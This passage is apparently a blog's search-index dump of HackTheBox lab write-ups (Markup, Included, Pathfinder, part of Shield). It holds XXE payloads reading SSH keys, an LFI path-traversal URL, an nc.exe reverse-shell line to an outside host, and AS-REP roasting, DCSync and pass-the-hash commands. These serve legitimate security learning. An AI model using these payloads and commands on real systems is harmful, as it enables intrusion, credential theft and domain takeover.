","date":"06-08-2021","objectID":"/posts/htb/markup/:1:2","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Order Well, I found out. We can order something on the order page Let’s try ordering something the result order alerted Every time a user orders something it’s always pop up this message. Let’s try check how this form handle the request ","date":"06-08-2021","objectID":"/posts/htb/markup/:1:3","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Burpsuite I’m gonna intercept the request by using burpsuite Then, send the request into repeater tab I found this body kinda weird at first. It’s doesn't look like any JSON data xml post data Then, I realize this is XML [Extensible Markup Language] Well, I heard something about XML injection before Let’s try it ","date":"06-08-2021","objectID":"/posts/htb/markup/:1:4","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"XXE [XML External Entity Injection] Description An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Wikipedia - XML external entity attack Source [YouTube]PwnFunction - XML External Entities (Explained) HackTricks - Xml External Entity Portswigger - XXE ","date":"06-08-2021","objectID":"/posts/htb/markup/:2:0","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"New Entity I’m going to test if a simple new ENTITY declaration is working here’s what the payload gonna looks like. Source HackTricks - Xml External Entity \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [\u003c!ENTITY example \"test\"\u003e ]\u003e \u003cstockCheck\u003e \u003cproductId\u003e\u0026example;\u003c/productId\u003e \u003cstoreId\u003e1\u003c/storeId\u003e \u003c/stockCheck\u003e the result xxe result it is working ","date":"06-08-2021","objectID":"/posts/htb/markup/:2:1","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Read File Now, Let’s try to read a file with it So, I’m gonna insert this command \u003c?xml version = \"1.0\"?\u003e \u003c!DOCTYPE foo [\u003c!ENTITY example SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\"\u003e ]\u003e \u003corder\u003e \u003cquantity\u003e 1 \u003c/quantity\u003e \u003citem\u003e \u0026example; \u003c/item\u003e \u003caddress\u003e Bed for sleeping of course \u003c/address\u003e \u003c/order\u003e the result xxe read file Wow! It works ","date":"06-08-2021","objectID":"/posts/htb/markup/:2:2","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access Remember this machine has SSH open. Let’s try to read the SSH private key Windows SSH key locate here: C:\\Users\\USERNAME\\.ssh\\ ","date":"06-08-2021","objectID":"/posts/htb/markup/:3:0","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"SSH I’m gonna put this as a payload \u003c?xml version = \"1.0\"?\u003e \u003c!DOCTYPE foo [\u003c!ENTITY example SYSTEM \"file:///c:/users/daniel/.ssh/id_rsa\"\u003e ]\u003e \u003corder\u003e \u003cquantity\u003e 1 \u003c/quantity\u003e \u003citem\u003e \u0026example; \u003c/item\u003e \u003caddress\u003e Bed for sleeping of course \u003c/address\u003e \u003c/order\u003e the result xxe read ssh key WOW! we’ve got the private key Let’s copy it and try login with SSH Tip Before we can log in. Make sure to change the permission of the key with the command chmod 600 \u003cfilename\u003e Now, Let’s try login with this command ssh -i \u003cfilename\u003e daniel@10.10.10.49 ssh as daniel I’m in ","date":"06-08-2021","objectID":"/posts/htb/markup/:3:1","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"User Flag user flag ","date":"06-08-2021","objectID":"/posts/htb/markup/:3:2","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Log-Management Let’s start to enumerate this machine I found kinda sus folder in the root directory maybe I don’t know it’s actually exists found Log-Management directory The folder called Log-Management Found the file name job.bat and see the content of that file contents inside job.bat file So, I’m gonna assume this script for clearing event log and gonna run automatically like UNIX cronjob ¯\\__(ツ)_/¯ ","date":"06-08-2021","objectID":"/posts/htb/markup/:3:3","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Checking File Permission We can abuse this if we had the permission to change the content of the file Source Microsoft - wevutils Microsoft - icacls superuser - windows list file permission GeeksforGeeks - basic of batch scripting I’m going to run this command icacls job.txt checking file permission we’ve got full access to that file remember we’re still daniel Let’s get the shell ","date":"06-08-2021","objectID":"/posts/htb/markup/:3:4","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"06-08-2021","objectID":"/posts/htb/markup/:4:0","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"nc.exe Let’s get the reverse shell. First, we need to upload nc.exe into the machine Windows do not come with nc installed. So, we need to upload it transfer nc.exe First, let’s start our nc for listening to the connection Then, put this payload in job.bat c:\\log-management\\nc.exe -e cmd.exe 10.10.14.43 9901 put the payload in job.bat file the result we’ve got the shell and own the box shell as administrator ","date":"06-08-2021","objectID":"/posts/htb/markup/:4:1","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Admin Flag root flag ","date":"06-08-2021","objectID":"/posts/htb/markup/:4:2","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. The XXE is so cool and it also can be dangerous if the input is not properly configured. Talk about “configure”. The file admin can run also need to configure properly in this case file called job.bat. Once again, don’t use the same password. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"06-08-2021","objectID":"/posts/htb/markup/:5:0","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Enumeration scan top 1000 ports nmap -sC -sV -oN nmap/initial 10.10.10.55 the result nmap initial scan scan all ports nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.55 the result nmap allports scan ","date":"29-07-2021","objectID":"/posts/htb/included/:1:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Open Ports Well, both the Nmap result shows only port 80 just open That’s mean this server have a website ","date":"29-07-2021","objectID":"/posts/htb/included/:1:1","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Local File Inclusion [LFI] Based on the Nmap scan result, This server has a website Let’s take a look webpage has file parameter When I saw this string that had file as parameter I’m always thinking Local File Inclusion [LFI] Let’s try it with this string: http://10.10.10.55/?file=../../../../../../../etc/passwd the result lfi read /etc/passwd We can try to get Remote Code Execution [RCE] through log poisoning Well, we can’t Let’s try to enumerate again Quick Note: I’ve already found the website is vuln to Local File Inclusion [LFI]. However, I can’t find anything. To be honest, I took a peek of the writeup. There is no shamed of and I’m still learning. So, Here we go. ","date":"29-07-2021","objectID":"/posts/htb/included/:1:2","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"UDP Scan nmap -sU -oN nmap/UDP_scan 10.10.10.55 I’m gonna run the nmap scan once again with -sU flag for UDP scan the result nmap udp scan ","date":"29-07-2021","objectID":"/posts/htb/included/:1:3","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Trivial File Transfer Protocol [TFTP] Description Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. Read more here Wikipedia - Trivial File Transfer Protocol In simple term this protocol is simple than regular protocol [FTP] ","date":"29-07-2021","objectID":"/posts/htb/included/:1:4","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Put File Now, we’ve already know the website can do directory traversal. Let’s put the simple Hello,World file in TFTP put file in tftp Let's hit that file using LFI But where is the location of that file? according this link It’s locate /var/lib/tftpboot Let’s try it out read file in tftp It Work! ","date":"29-07-2021","objectID":"/posts/htb/included/:1:5","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access Let’s try get the reverse shell So, I’m gonna put the php reverse shell into TFTP put php reverse shell in tftp Start the listener and execute it shell as www-data I’M IN! ","date":"29-07-2021","objectID":"/posts/htb/included/:2:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"User Flag Let’s try login as Mike with a password from the previous box Success user flag ","date":"29-07-2021","objectID":"/posts/htb/included/:3:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Mike Now, we’ve got Mike’s password. So, I’m gonna check Mike’s sudo capabilities by run this command sudo -l # Well, that's unfortunate mike@included:~$ sudo -l [sudo] password for mike: Sorry, user mike may not run sudo on included. Let’s check out his group, etc with id command mike@included:~$ id uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd) mike@included:~$ Owhhh. I’m thinking we can become root with exploit lxd Because I found one of the machines in TryHackMe have this same vuln. Sources Doct3rJohn - GamingServer[THM] Hacking Articles - lxd-privilege-escalation Github - lxd-alpine-builder ","date":"29-07-2021","objectID":"/posts/htb/included/:4:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"29-07-2021","objectID":"/posts/htb/included/:5:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"LXD Let’s try it. First, I’m gonna git clone the lxd-alpine-builder Then, run the build-alpine command. building alpine After it’s done building. The tar file will be created in our directory. Now, we need to download the tar file from our victim machine. transfer alpine This next bit gonna be complicated. So, if you wanna follow along. Please do becoming root YESSSS. I’M ROOT ","date":"29-07-2021","objectID":"/posts/htb/included/:5:1","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Root Flag root flag ","date":"29-07-2021","objectID":"/posts/htb/included/:6:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. First, make sure to do recon properly and make sure to scan everything TCP/UDP/everything. Then, configure the webpage properly. Most of the time the webpage is the easier/first thing they(hacker) look at. Once again, don’t use the same password. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"29-07-2021","objectID":"/posts/htb/included/:7:0","tags":["lfi","tftp","lxd-alpine","php-reverse-shell"],"title":"HackTheBox - Included Writeup","uri":"/posts/htb/included/"},{"categories":["HacktheBox"],"content":"Enumeration scan top 1000 ports nmap -sC -sV -oN nmap/initial 10.10.10.30 the result # Nmap 7.91 scan initiated Sat Jul 10 02:31:44 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.30 Nmap scan report for 10.10.10.30 Host is up (0.34s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-10 01:40:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h07m25s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-10T01:40:31 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 10 02:33:21 2021 -- 1 IP address (1 host up) scanned in 96.82 seconds scan all ports nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.30 the result # Nmap 7.91 scan initiated Tue Jul 13 07:49:25 2021 as: nmap -sC -sV -p- -oN nmap/all_ports megacorp.local Nmap scan report for megacorp.local (10.10.10.30) Host is up (0.34s latency). rDNS record for 10.10.10.30: MEGACORP.LOCAL Not shown: 65511 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-13 07:24:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49683/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h07m28s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-13T07:25:12 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 13 08:17:58 2021 -- 1 IP address (1 host up) scanned in 1712.57 seconds ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:1:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Open Ports Well, that’s a lot of open port with quick scan. Looks like this is Domain Controller ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:1:1","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Hosts First, I’m gonna add MEGACORP.LOCAL into /etc/hosts file add hostname in /etc/hosts ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:1:2","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAP Description The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol network. ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAPsearch Enumerate LDAP (Lightweight Directory Access Protocol) By using the tool called ldapsearch ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:1","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAP QUERY [ldapsearch] Let’s query this LDAP by using ldapsearch By using this command Source Ippsec - Enumerating LDAP with LDAPSEARCH ldapsearch -x -h megacorp.local -s base namingcontexts the result ldapsearch ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:2","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAP DUMP [ldapsearch] Let’s dump all with this command Source Ippsec - Playing with LDAP Again (with the Amanda Creds) devconnected - How To Search LDAP using ldapsearch ldapsearch -x -h megacorp.local -b \"dc=megacorp,dc=local\" the result ldapsearch query error well, the operation was error lucky for me. I’ve got sandra credentials from previous box shield let’s try bind it with those creds ldapsearch -x -h megacorp.local -b \"dc=megacorp,dc=local\" -D 'sandra@megacorp.local' -w 'where_you_put_the_password_in' the result ldapsearch query with sandra credentials the output pretty much crazy and crazy above was the snippet of it ;) so, I’m gonna save it in file called ldump_all ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:3","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAP DUMP USER [ldapsearch] Let’s dump all the user and save it in file called ldump_users Source ATLANSSIAN - How to write LDAP search filters ldapsearch -x -h megacorp.local -b \"dc=megacorp,dc=local\" -D 'sandra@megacorp.local' -w 'where_you_put_the_password_in' \"(\u0026(objectClass=person)(objectClass=user))\" the result # extended LDIF # # LDAPv3 # base \u003cdc=megacorp,dc=local\u003e with scope subtree # filter: (\u0026(objectClass=person)(objectClass=user)) # requesting: ALL # # Administrator, Users, MEGACORP.LOCAL dn: CN=Administrator,CN=Users,DC=MEGACORP,DC=LOCAL objectClass: top objectClass: person --[[SNIP]]-- # search reference ref: ldap://ForestDnsZones.MEGACORP.LOCAL/DC=ForestDnsZones,DC=MEGACORP,DC=LOC AL # search reference ref: ldap://DomainDnsZones.MEGACORP.LOCAL/DC=DomainDnsZones,DC=MEGACORP,DC=LOC AL # search reference ref: ldap://MEGACORP.LOCAL/CN=Configuration,DC=MEGACORP,DC=LOCAL # search result search: 2 result: 0 Success # numResponses: 10 # numEntries: 6 # numReferences: 3 Finally, we’ve got all the users users list Well, I can’t find anything usefull So, I went to the internet for searching tool for dumping user from LDAP Finally, I found one that can work ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:4","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"LDAP DUMP [ldapdomaindump] Let’s dump all the user Before, I run the command. I’m gonna make a folder real quick called ldap_dumps Source Github - ldapdomaindump ldapdomaindump -u megacorp\\\\sandra -p put_the_passwd_in -o ldap_dumps 10.10.10.30 ldapdomaindump the command above is dumping all in folder called ldap_dumps the result, we’ve got a lot of file let’s take a look at domain_users.html view domain_users.html ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:2:5","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Kerberos Description Kerberos (/ˈkɜːrbərɒs/) is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. The protocol was named after the character Kerberos (or Cerberus) from Greek mythology, the ferocious three-headed guard dog of Hades. Source Wikipedia - Kerberos(protocol) ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:3:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Kerberos - [DONT_REQ_PREAUTH] Source Kerberos - Pentest Book hacking articles - Abusing Kerberos Using Impacket ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:3:1","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Impacket [GetNPUsers.py] Note This script will attempt to list and get TGTs for those users that have the property Do not require Kerberos preauthentication set (UF_DONT_REQUIRE_PREAUTH). svc_bes user have very unique flags that state DONT_REQ_PREAUTH with those flags. I’m gonna use this impacket tool called GetNPUsers.py the output will save in file called svc_bes.hash in John-The-Ripper[JtR] format. GetNPUsers.py megacorp.local/svc_bes -no-pass -request -format john \u003e svc_bes.hash ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:3:2","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"John-The-Ripper Use JtR for cracking the file the result cracked svc_bes hash Now, We’ve got the svc_bes user password ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:3:3","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:4:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Evil-Winrm Nmap scan show us winrm port is open [port 5985] Source Tyler Muir - Default WinRm Ports and How to Change Them Let’s try connect into this machine with those creds By using Evil-winrm Source Github - evil-winrm evil-winrm -i 10.10.10.30 -u svc_bes -p put_the_password_here login as svc_bes ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:5:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"User Flag user flag ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:5:1","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:6:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"DCSync Attack Description DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a Golden Ticket, as DCSync can be used to compromise the krbtgt account’s password. Source StealthBits - privilege-escalation-using-mimikatz-dcsync Hacking Articles - Credential Dumping: DCSync Attack Pentestlab - Dumping Domain Password Hashes ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:7:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Impacket [SecretsDump.py] Description Performs various techniques to dump hashes from the remote machine without executing any agent there. Source Ippsec - Running SecretsDump with svc_loanmgr to perform a DCSYNC I’m gonna run secretsdump.py with this command secretsdump.py megacorp.local/svc_bes:password_here@10.10.10.30 the result DCSync attack We manage to dump all the users hash The most important hash is the Administrator hash Do we crack it? Actually… We can login as Administrator by using password hashes By using another Impacket script called psexec.py ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:7:1","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Impacket [psexec.py] Description PSEXEC like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine remotely. Source IppSec - Performing a Pass The Hash with the administrator user using PSExec IppSec - Performing SecretsDump to perform a DCSync and extract hashes, then PSEXEC with Administrator to gain access Hacking Articles - Remote Code Execution Using Impacket InfosecMatter - RCE on Windows from Linux Part 1: Impacket I will run this command psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d5xxxxxxxxxxxxxxxxx the result login as nt authority\\system ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:7:2","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Admin flag root flag ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:7:3","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. I’m new to the AD/Domain Controller Hacks or whatever you want to call it :). This machine is so fun and I’ve gained a lot of knowledge about it. Do not rely on one tool only. You need to explore and find another tool and understanding it. Lastly, it is important to configure the user correctly and securely. Before I forgot, again do not put any credentials on the non-secure machine. Even tho it’s happened, quickly change the password. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"21-07-2021","objectID":"/posts/htb/pathfinder/:8:0","tags":["ldap","ldapsearch","ldapdomaindump","kerberos","ASREPRoast","GetNPUsers.py","DCSync-attack","secretsdump.py","john","evil-winrm","psexec.py"],"title":"HackTheBox - Pathfinder Writeup","uri":"/posts/htb/pathfinder/"},{"categories":["HacktheBox"],"content":"Enumeration scan top 1000 ports the result nmap -sC -sV -oN nmap/initial 10.10.10.29 scan all ports the result nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.29 all scan still the same open ports 80 / http 3306 / mysql ","date":"21-07-2021","objectID":"/posts/htb/shield/:1:0","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"WebPage Just default windows server page ","date":"21-07-2021","objectID":"/posts/htb/shield/:2:0","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Gobuster Using gobuster to find any hidden directory the result 